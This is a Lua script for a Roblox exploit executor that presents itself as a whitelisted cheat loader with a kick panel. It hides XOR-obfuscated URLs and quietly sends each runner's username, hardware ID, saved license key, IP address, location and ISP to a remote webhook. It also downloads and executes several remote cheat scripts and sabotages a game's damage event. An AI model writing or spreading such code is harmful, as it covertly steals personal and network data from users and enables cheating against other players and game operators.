local _lp = game:GetService("Players").LocalPlayer
local _ts = game:GetService("TestService")
local _stg = _ts:FindFirstChild("__NK_RUNTIME")
local _auth = _stg and _stg:FindFirstChild(_lp.Name)

if not (shared._NK_AUTH == "V8_SECURE_AUTH" or (_auth and _auth.Value == "V8_SECURE_AUTH")) then
    _lp:Kick("Execution prohibited. Use official loader.")
    return
end
shared._NK_AUTH = nil

local function _D(d, k)
    local r = ""
    for i = 1, #d do r = r .. string.char(bit32.bxor(d[i] - i, k)) end
    return r
end

local _0xK = 0x3A
local _W = _D({137, 150, 151, 148, 152, 96, 86, 87, 143, 141, 152, 137, 150, 154, 141, 88, 137, 150, 149, 84, 135, 151, 145, 87, 160, 143, 141, 148, 156, 157, 154, 163, 96, 99, 104, 101, 111, 107, 104, 114, 115, 108, 113, 110, 115, 119, 120, 118, 123, 122, 124, 125, 117, 186, 191, 125, 173, 192, 163, 189, 147, 124, 163, 131, 165, 169, 173, 157, 163, 135, 202, 138, 167, 174, 161, 179, 212, 192, 152, 185, 203, 175, 199, 170, 197, 204, 184, 205, 188, 152, 190, 228, 223, 231, 214, 200, 195, 172, 168, 216, 190, 199, 220, 220, 204, 238, 224, 173, 176, 209, 247, 228, 216, 220, 247, 204, 189, 190, 201, 240, 235}, _0xK)
local _IP = _D({137, 150, 151, 148, 95, 85, 86, 145, 153, 87, 140, 156, 150, 92, 146, 159, 158, 97, 157, 167, 164, 164, 102, 119, 159, 163, 160, 168, 161, 177, 124, 179, 181, 163, 183, 185, 184, 114, 170, 183, 190, 184, 191, 190, 198, 122, 178, 185, 197, 203, 127, 200, 190, 195, 188, 210, 200, 200, 192, 136, 198, 209, 207, 140, 210, 215, 200, 214, 222, 146, 215, 218, 216, 226, 228, 152, 213, 221, 226, 228, 218, 224, 218}, _0xK)

local Config = {
    WL = { UIDs = {"10760143653"}, HWIDs = {"1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE"}, Keys = {"89D11F50-5490-4677-B709-4EBFBECA78CE", "46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F"} },
    BL = { UIDs = {}, HWIDs = {}, Keys = {} }
}

local _H = game:GetService("HttpService")
local _uid = tostring(_lp.UserId)
local _hw = game:GetService("RbxAnalyticsService"):GetClientId()
local _tk = "N/A"
pcall(function() if isfile("nazarkus_key.json") then _tk = readfile("nazarkus_key.json") end end)

local function chk(l)
    for _, v in ipairs(l.UIDs or {}) do if v == _uid then return true end end
    for _, v in ipairs(l.HWIDs or {}) do if v == _hw then return true end end
    for _, v in ipairs(l.Keys or {}) do if v == _tk then return true end end
    return false
end

local _st = chk(Config.WL) and "whitelist" or (chk(Config.BL) and "blacklist" or "guest")

local function _LOG()
    pcall(function()
        local req = (syn and syn.request or request or http_request)
        local r = req({Url = _IP, Method = "GET"})
        local ni = r and r.Success and _H:JSONDecode(r.Body) or {}
        
        local u = 0
        local tu = {"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}
        for _, f in ipairs(tu) do if getgenv()[f] then u = u + 1 end end
        local exe = (identifyexecutor and identifyexecutor() or "Unknown").." (UNC: "..math.floor((u/4)*100).."%)"
        
        local jid = game.JobId == "" and "Unknown" or game.JobId
        local joinLink = "https://tinyurl.com/api-create.php?url=roblox://experiences/start?placeId="..game.PlaceId.."&gameInstanceId="..jid
        local jBtn = "N/A" pcall(function() local jr = req({Url = joinLink, Method = "GET"}) if jr.Success then jBtn = jr.Body end end)
        
        local payload = {
            ["embeds"] = {{
                ["title"] = (_st == "whitelist" and "Whitelisted User Executed" or "Unknown/Guest User Executed"),
                ["color"] = (_st == "whitelist" and 65280 or 16753920),
                ["fields"] = {
                    {["name"] = "Player Info", ["value"] = string.format("Name: %s (@%s)\nID: %s\nAge: %d days", _lp.DisplayName, _lp.Name, _uid, _lp.AccountAge), ["inline"] = false},
                    {["name"] = "Executor", ["value"] = exe, ["inline"] = true},
                    {["name"] = "Hardware", ["value"] = "HWID: `".._hw.."`\nKey: `".._tk.."`", ["inline"] = false},
                    {["name"] = "Network", ["value"] = string.format("IP: %s\nLoc: %s, %s\nISP: %s", ni.query or "N/A", ni.city or "N/A", ni.country or "N/A", ni.isp or "N/A"), ["inline"] = false},
                    {["name"] = "Game", ["value"] = string.format("PlaceID: %d\nJobId: %s", game.PlaceId, jid), ["inline"] = false},
                    {["name"] = "Links", ["value"] = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", jBtn, _uid), ["inline"] = false}
                }
            }}
        }
        req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _H:JSONEncode(payload)})
    end)
end

task.spawn(_LOG)

-- DRAGGABLE PANEL (Insert)
if _st == "whitelist" then
    task.spawn(function()
        local sg = Instance.new("ScreenGui", (gethui and gethui()) or game:GetService("CoreGui"))
        local f = Instance.new("Frame", sg)
        f.Size = UDim2.new(0, 220, 0, 300); f.Position = UDim2.new(0.5,-110,0.5,-150); f.BackgroundColor3 = Color3.fromRGB(30,30,35); f.Visible = false; f.Active = true; f.Draggable = true
        Instance.new("UICorner", f)
        local s = Instance.new("ScrollingFrame", f)
        s.Size = UDim2.new(1,-10,1,-20); s.Position = UDim2.new(0,5,0,10); s.BackgroundTransparency = 1
        Instance.new("UIListLayout", s).Padding = UDim.new(0, 5)
        local function refresh()
            for _, v in ipairs(s:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
            for _, pObj in ipairs(_stg:GetChildren()) do
                local b = Instance.new("TextButton", s)
                b.Size = UDim2.new(1, 0, 0, 30); b.Text = pObj.Name; b.TextColor3 = Color3.new(1,1,1); b.BackgroundColor3 = Color3.fromRGB(45,45,50)
                b.MouseButton1Click:Connect(function() pObj.Value = "kick" end)
            end
        end
        game:GetService("UserInputService").InputBegan:Connect(function(k, g) if not g and k.KeyCode == Enum.KeyCode.Insert then f.Visible = not f.Visible refresh() end end)
    end)
end

_auth.Changed:Connect(function(v) if v == "kick" then _lp:Kick("Access Revoked.") end end)

pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/rpg/main/easy.lua"))() end)
pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))() end)
pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end)
pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nazarkus/infammo/main/infammo.lua"))() end)
pcall(function() if game:GetService("ReplicatedStorage"):FindFirstChild("ACS_Engine") then game:GetService("ReplicatedStorage").ACS_Engine.Events.FDMG:Destroy() end end)
